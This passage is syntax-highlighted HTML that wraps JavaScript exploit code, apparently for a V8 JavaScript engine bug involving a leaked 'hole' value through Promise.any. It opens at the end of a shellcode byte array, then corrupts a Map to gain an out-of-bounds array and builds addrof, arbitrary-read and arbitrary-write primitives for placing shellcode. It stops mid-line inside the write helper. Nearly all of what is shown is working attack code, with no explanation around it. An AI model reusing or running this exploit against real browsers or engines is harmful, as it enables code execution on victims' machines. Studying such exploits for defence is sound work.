0x20</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x66</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x6c</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x61</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x67</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x2e</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x74</span><span style="color:#666666">,</span><br><span style="color:#4C9A91">  0x78</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x74</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x00</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x56</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x57</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x54</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x5e</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x6a</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x3b</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x58</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x0f</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x05</span><span style="color:#666666">,</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> buf</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> ArrayBuffer</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> f64</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Float64Array</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">buf</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> u32</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Uint32Array</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">buf</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> bigUint64</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> BigUint64Array</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">buf</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">f2i</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">val</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    f64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> val</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> bigUint64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#80A665">i2f</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">val</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    bigUint64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> val</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> f64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#80A665">d2u</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">v</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    f64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> v</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> Array</span><span style="color:#666666">.</span><span style="color:#80A665">from</span><span style="color:#4d9375">(</span><span style="color:#BD976A">u32</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#80A665">u2d</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">lo</span><span style="color:#666666">,</span><span style="color:#BD976A"> hi</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    u32</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> lo</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    u32</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> hi</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> f64</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#80A665">ByteToBigIntArray</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">payload</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> sc</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">[</span><span style="color:#4d9375">]</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> tmp</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> lenInt</span><span style="color:#666666"> =</span><span style="color:#80A665"> BigInt</span><span style="color:#4d9375">(</span><span style="color:#BD976A">Math</span><span style="color:#666666">.</span><span style="color:#80A665">floor</span><span style="color:#d4976c">(</span><span style="color:#BD976A">payload</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 8</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#BD976A"> lenInt</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +=</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676">n</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#BD976A">        tmp</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        for</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> j</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><span style="color:#BD976A"> j</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><span style="color:#BD976A"> j</span><span style="color:#CB7676">++</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">            tmp</span><span style="color:#CB7676"> +=</span><span style="color:#80A665"> BigInt</span><span style="color:#d9739f">(</span><span style="color:#BD976A">payload</span><span style="color:#e6cc77">[</span><span style="color:#BD976A">i</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> j</span><span style="color:#e6cc77">]</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> *</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">0x1</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#4C9A91">8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> *</span><span style="color:#BD976A"> j</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><br><span style="color:#BD976A">        sc</span><span style="color:#666666">.</span><span style="color:#80A665">push</span><span style="color:#d4976c">(</span><span style="color:#BD976A">tmp</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> len</span><span style="color:#666666"> =</span><span style="color:#BD976A"> payload</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    tmp</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#BD976A"> len</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676">++</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#BD976A">        tmp</span><span style="color:#CB7676"> +=</span><span style="color:#80A665"> BigInt</span><span style="color:#d4976c">(</span><span style="color:#BD976A">payload</span><span style="color:#d9739f">[</span><span style="color:#BD976A">lenInt</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> +</span><span style="color:#BD976A"> i</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> *</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#4C9A91">0x1</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">8</span><span style="color:#CB7676">n</span><span style="color:#CB7676"> *</span><span style="color:#BD976A"> i</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#BD976A">    sc</span><span style="color:#666666">.</span><span style="color:#80A665">push</span><span style="color:#4d9375">(</span><span style="color:#BD976A">tmp</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> sc</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#CB7676">function</span><span style="color:#80A665"> trigger</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> v1</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    function</span><span style="color:#80A665"> f0</span><span style="color:#4d9375">(</span><span style="color:#BD976A">v4</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        v4</span><span style="color:#d4976c">(</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#d9739f">{</span><span style="color:#666666"> </span><span style="color:#d9739f">}</span><span style="color:#666666">,</span><span style="color:#BD976A"> v5</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#d9739f">{</span><br><span style="color:#BD976A">            v1</span><span style="color:#666666"> =</span><span style="color:#BD976A"> v5</span><span style="color:#666666">.</span><span style="color:#BD976A">errors</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d9739f">}</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#BD976A">    f0</span><span style="color:#666666">.</span><span style="color:#80A665">resolve</span><span style="color:#666666"> =</span><span style="color:#CB7676"> function</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">v6</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">        return</span><span style="color:#BD976A"> v6</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> v3</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        then</span><span style="color:#d4976c">(</span><span style="color:#BD976A">v7</span><span style="color:#666666">,</span><span style="color:#BD976A"> v8</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#80A665">            v8</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#B8A965">    Promise</span><span style="color:#666666">.</span><span style="color:#BD976A">any</span><span style="color:#666666">.</span><span style="color:#80A665">call</span><span style="color:#4d9375">(</span><span style="color:#BD976A">f0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><span style="color:#BD976A">v3</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> v1</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> hole</span><span style="color:#666666"> =</span><span style="color:#80A665"> trigger</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">var</span><span style="color:#BD976A"> map</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Map</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">set</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">kiprey</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">set</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">hole</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x8</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">delete</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">hole</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">delete</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">hole</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">delete</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">kiprey</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">print</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#BD976A">size</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">set</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0x18</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">kiprey</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">var</span><span style="color:#BD976A"> nop</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Array</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">var</span><span style="color:#BD976A"> oobArray</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><span style="color:#666666">;</span><br><span style="color:#BD976A">oobArray</span><span style="color:#666666">.</span><span style="color:#80A665">push</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1.1</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">var</span><span style="color:#BD976A"> objArray</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">tag</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0xdead</span><span style="color:#666666">,</span><br><span style="color:#C98A7D77">    "</span><span style="color:#C98A7D">leak</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#4C9A91"> 0x1234</span><span style="color:#666666">,</span><br><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br><span style="color:#BD976A">bigUintArray</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> BigUint64Array</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">bigUintArray</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x1234</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#BD976A">bigUintArray</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0x5678</span><span style="color:#CB7676">n</span><span style="color:#666666">;</span><br><span style="color:#BD976A">map</span><span style="color:#666666">.</span><span style="color:#80A665">set</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">kiprey</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">addrof</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">obj</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    objArray</span><span style="color:#666666">.</span><span style="color:#BD976A">leak</span><span style="color:#666666"> =</span><span style="color:#BD976A"> obj</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#4C9A91"> 0x3000</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676">++</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#CB7676">        let</span><span style="color:#BD976A"> half</span><span style="color:#666666"> =</span><span style="color:#80A665"> d2u</span><span style="color:#d4976c">(</span><span style="color:#BD976A">oobArray</span><span style="color:#d9739f">[</span><span style="color:#BD976A">i</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">half</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">0xdead</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 1</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">            ret</span><span style="color:#666666"> =</span><span style="color:#BD976A"> half</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">            break</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">half</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#4C9A91">0xdead</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 1</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#BD976A">            ret</span><span style="color:#666666"> =</span><span style="color:#80A665"> d2u</span><span style="color:#d9739f">(</span><span style="color:#BD976A">oobArray</span><span style="color:#e6cc77">[</span><span style="color:#BD976A">i</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#e6cc77">]</span><span style="color:#d9739f">)</span><span style="color:#d9739f">[</span><span style="color:#4C9A91">0</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">            break</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> BigInt</span><span style="color:#4d9375">(</span><span style="color:#BD976A">ret</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> base_offset</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> external_offset</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> big_len_offset</span><span style="color:#666666">;</span><br><span style="color:#4D9375">for</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#4C9A91"> 0x3000</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676">++</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">f2i</span><span style="color:#d4976c">(</span><span style="color:#BD976A">oobArray</span><span style="color:#d9739f">[</span><span style="color:#BD976A">i</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0x1234</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#BD976A">        base_offset</span><span style="color:#666666"> =</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 12</span><span style="color:#666666">;</span><br><span style="color:#BD976A">        external_offset</span><span style="color:#666666"> =</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 11</span><span style="color:#666666">;</span><br><span style="color:#BD976A">        big_len_offset</span><span style="color:#666666"> =</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> base_ptr</span><span style="color:#666666"> =</span><span style="color:#80A665"> f2i</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">base_offset</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> external_ptr</span><span style="color:#666666"> =</span><span style="color:#80A665"> f2i</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">external_offset</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> big_len</span><span style="color:#666666"> =</span><span style="color:#80A665"> f2i</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">big_len_offset</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">arb_r</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#BD976A">    oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">base_offset</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> i2f</span><span style="color:#4d9375">(</span><span style="color:#BD976A">addr</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 0x8</span><span style="color:#CB7676">n</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> ret</span><span style="color:#666666"> =</span><span style="color:#BD976A"> bigUintArray</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#BD976A"> ret</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#80A665">arb_w</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#666666">,</span><span style="color:#BD976A"> payload</span><span style="color:#5eaab5">)</span><span style="color:#666666"> =</span><span style="color:#666666">></span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    let</span><span style="color:#BD976A"> sc</span><span style="color:#666666"> =</span><span style="color:#80A665"> ByteToBigIntArray</span><span style="color:#4d9375">(</span><span style="color:#BD976A">payload</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">big_len_offset</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> i2f</span><span style="color:#4d9375">(</span><span style="color:#80A665">BigInt</span><span style="color:#d4976c">(</span><span style="color:#BD976A">sc</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">base_offset</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> i2f</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#CB7676">n</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    oobArray</span><span style="color:#4d9375">[</span><span style="color:#BD976A">external_offset</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> i2f</span><span style="color:#4d9375">(</span><span style="color:#BD976A">addr</span><span 